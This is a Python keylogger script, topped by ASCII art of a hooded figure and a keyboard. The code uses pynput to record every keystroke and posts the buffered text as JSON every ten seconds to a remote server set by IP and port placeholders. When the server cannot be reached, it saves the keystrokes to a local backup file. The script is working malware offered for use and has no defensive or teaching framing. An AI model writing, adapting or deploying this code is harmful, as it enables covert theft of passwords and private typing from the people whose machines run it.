"""
                                                                                      nnnnnnHHHHHHHHHHHHHnnnnnn
                                                                                nHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHn
                                                                             nHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHn
                                                                          nHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHn
                                                                        nHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHn
                                                                       HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
                                                                     nHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHn
                                                                    HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
                                                                   HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH
                                                                  HHHHHHHHHHHHHHHHHHHHHHH^^~"    ~H~    ~~^^HHHHHHHHHHHHHHHHHHHHHHH
                                                                 HHHHHHHHHHHHHHHHHHHHHH:^                    ^HHHHHHHHHHHHHHHHHHHHHH
                                                                nHHHHHHHHHHHHHHHHHHHHH:                       ^HHHHHHHHHHHHHHHHHHHHHn
                                                                HHHHHHHHHHHHHHHHHHHHH::                        ^HHHHHHHHHHHHHHHHHHHHH
                                                               HHHHHHHHHHHHHHHHHHHHHH:                   .      HHHHHHHHHHHHHHHHHHHHHH
                                                               HHHHHHHHHHHHHHHHHHHHH|:                          |HHHHHHHHHHHHHHHHHHHHH
                                                              HHHHHHHHHHHHHH%%%%:::H|: ~~~~----- -      ------  |:::%%%%HHHHHHHHHHHHHHH
                                                              HH~              ~HHHH|:   ~~  -----    - ---     |HHHH~              ~HH
                                                                                HHHH|:\\\.                 ./// |HHHH
                                                                  ____________   HHH|: \\\\\\\\. / \ .////////  |HHH
                                                                 /____________\   HH|:=-- ----  \.  : (_@_> .   |HH
                                                                /%%%%%%%%%%%  %\   H|:   ~-- ~~:|.  :   ~ -'   :|H
                                                               |%%%%%%%%%%%%%  %|  ||:        .:|.  :         :'||   "My goal is to turn !
                                                                \=---%%%%%%%' %/   \|:       .:/.   '\        : |/      everything off 🎭!"
                                                               /:   _)%%%%%'.--.    |:.      :(.     .)\      : |
                                                              ( _-=%%%%%%'.%(  )    |:|     /::::._.-~  \       |
                                                               (    :    )%~/~~|    ::|    / /.____    . \    : :
                                                               :--------~|     :    `:::  (  \%========/\       '
                                                               (__:_) |% |(   /    /%%::\     ~~~~----'  \     '=\
                                                                (  : )|% |   /    /H%%%::\                    '==%\
                                                                 `---'|% | -~ ---(%%H%%%:::.\           /   .===%==)---
                                                                 |  _.%%.%.|      \%%H%%%%n:::._______.::.-===:%==/
                                                                 |  ~~~~~~~|       \%%DrS%%%%~---------~=====%%==/      DrS


                                                                . -------------------------------------------------------------------.        
                                                                | [Esc] [F1][F2][F3][F4][F5][F6][F7][F8][F9][F0][F10][F11][F12] o o o|        
                                                                |                                                                    |        
                                                                | [`][1][2][3][4][5][6][7][8][9][0][-][=][_<_] [I][H][U] [N][/][*][-]|        
                                                                | [|-][Q][W][E][R][T][Y][U][I][O][P][{][}] | | [D][E][D] [7][8][9]|+||        
                                                                | [CAP][A][S][D][F][G][H][J][K][L][;]['][#]|_|           [4][5][6]|_||        
                                                                | [^][\][Z][X][C][V][B][N][M][,][.][/] [__^__]    [^]    [1][2][3]| ||        
                                                                | [c]   [a][________________________][a]   [c] [<][V][>] [ 0  ][.]|_||        
                                                                `--------------------------------------------------------------------'        

"""

# Import necessary libraries
from pynput import keyboard  # To monitor keyboard inputs
import requests  # To send POST requests
import json  # To work with JSON data
import threading  # To run periodic tasks

# Global variable to store keystrokes
text = ""

# Server configuration
ip_address = "IP"  # Server IP address
port_number = "Port"  # Server port
time_interval = 10  # Time interval for sending data (in seconds)

# File for local backup in case of server issues
backup_file = "epykey_backup.txt"

def save_locally(data):
    """
    Save epykey locally in a file if the server is unreachable.
    """
    try:
        with open(backup_file, "a") as file:
            file.write(data + "\n")
    except IOError as e:
        print(f"Error saving data locally: {e}")

def send_post_req():
    """
    Sends the collected epykey to the server at regular intervals.
    """
    global text
    try:
        if text.strip():  # Only send if there's data to send
            payload = json.dumps({"keyboardData": text})
            headers = {"Content-Type": "application/json"}
            response = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers=headers)

            if response.status_code == 200:
                print("Data sent successfully.")
                text = ""  # Clear the buffer after successful sending
            else:
                print(f"Server error: {response.status_code}. Saving locally.")
                save_locally(text)
    except requests.RequestException as e:
        print(f"Failed to send data: {e}. Saving locally.")
        save_locally(text)

    # Schedule the next execution
    timer = threading.Timer(time_interval, send_post_req)
    timer.start()

def on_press(key):
    """
    Callback function to handle key press events.
    """
    global text

    try:
        # Handle special keys
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.backspace:
            text = text[:-1] if text else text
        elif key == keyboard.Key.esc:
            return False  # Stop the listener
        else:
            # Convert the key to a string and append it to the buffer
            text += str(key).replace("'", "")
    except Exception as e:
        print(f"Error processing key: {e}")

if __name__ == "__main__":
    # Start the keylogger
    print("Keylogger started. Press ESC to stop.")
    try:
        # Start sending data periodically
        send_post_req()

        # Start listening for key events
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("Keylogger stopped.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
                                               
